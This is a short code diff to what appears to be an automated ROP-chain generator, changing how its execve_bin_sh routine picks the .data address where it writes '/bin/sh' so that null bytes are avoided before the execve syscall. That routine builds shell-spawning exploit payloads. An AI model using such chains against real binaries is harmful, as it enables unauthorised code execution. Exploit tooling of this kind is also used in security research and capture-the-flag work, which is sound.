@@ -265,7 +265,11 @@ def execve_bin_sh(data_section_addr, null_ok):
     
     # Step-2: Writing "/bin/sh\x00" into .data section
     binsh = b'/bin//sh\x00\x00\x00\x00\x00\x00\x00\x00' if not null_ok else b'/bin/sh\x00'
-    fd.write(WriteStuffIntoMemory(binsh, data_section_addr))
+    if not null_ok and data_section_addr & 0xff == 0:
+        address = data_section_addr | 0x8
+    else:
+        address = data_section_addr
+    fd.write(WriteStuffIntoMemory(binsh, address))
     
     # Step-3: Write appropriate register values: 
     # rax <- 59
@@ -277,7 +281,7 @@ def execve_bin_sh(data_section_addr, null_ok):
         comments = ["prep rax for execve syscall", "command to run", "pointer to null", "pointer to null"], \
         isSmall = [True, False, False, False] if not null_ok else [], \
         noClobber = [], \
-        consts = [59, data_section_addr, data_section_addr+8, data_section_addr+8], isOffsets = [False, True, True, True]))
+        consts = [59, address, address+8, address+8], isOffsets = [False, True, True, True]))
     
     # Get syscall
     syscallList = getSyscallGadgets()
